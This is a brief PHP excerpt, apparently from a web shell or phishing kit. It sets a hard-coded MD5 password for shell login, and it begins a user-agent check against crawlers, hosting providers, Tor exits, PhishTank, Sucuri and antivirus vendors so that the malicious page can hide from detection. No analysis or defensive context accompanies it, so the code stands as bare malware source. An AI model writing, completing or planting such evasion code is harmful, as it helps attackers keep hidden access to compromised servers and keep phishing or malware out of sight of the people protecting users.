...
$auth_pass = "73fee192744f842a611a5ec336459f5c"; //password in md5 encryption
$color = "#00ff00"; 
...
if(!empty($_SERVER['HTTP_USER_AGENT'])) { 
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler", "kaspersky", "avast", "avira", "mcafee", "avg", "security", "malwarbytes"); 
